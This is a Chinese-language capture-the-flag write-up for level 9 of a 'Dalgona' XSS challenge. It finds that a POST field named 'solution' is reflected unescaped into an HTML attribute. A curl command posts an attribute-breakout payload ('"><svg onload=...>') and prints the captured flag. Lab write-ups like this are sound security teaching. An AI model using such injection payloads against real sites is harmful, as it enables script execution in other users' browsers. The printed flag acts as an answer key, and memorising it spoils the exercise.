## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 第 9 关（`static/css/xss/xss9.css`）。
表单是 `method="post"`，字段名是 **`solution`**（不是 `name`），placeholder 是 `Enter solution...`。

反射在属性里：

```html
<input type=text name=solution placeholder="Enter solution..." value="TESTX">
```

### 关键观察

- GET 的 `name` 参数**不反射**，必须用 `POST solution=`。
- `solution` 的值原样进 `value="…"`，`"`、`>`、`<`、空格都没有被处理。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -d 'solution="><svg onload=alert("XSS")>' "http://$T/page" \
| grep -o 'flag{[^}]*}'
# flag{5f8335f5-949c-4ee8-96d9-64abe34c02ac}
```

### flag 位置

POST `/page` 成功响应里 `Here is the flag:` 之后。

## 复盘

- **字段名/方法从表单读，不要沿用上一关。** 这关是 `POST solution`，
  用 `GET ?name=` 只会得到「没有反射」的假象。
- 属性上下文 → `">` 闭合，再挂 `<svg onload=alert("XSS")>`。
- 同族关卡过滤差异极大，但本关是「零过滤」，探测一次即可确定。
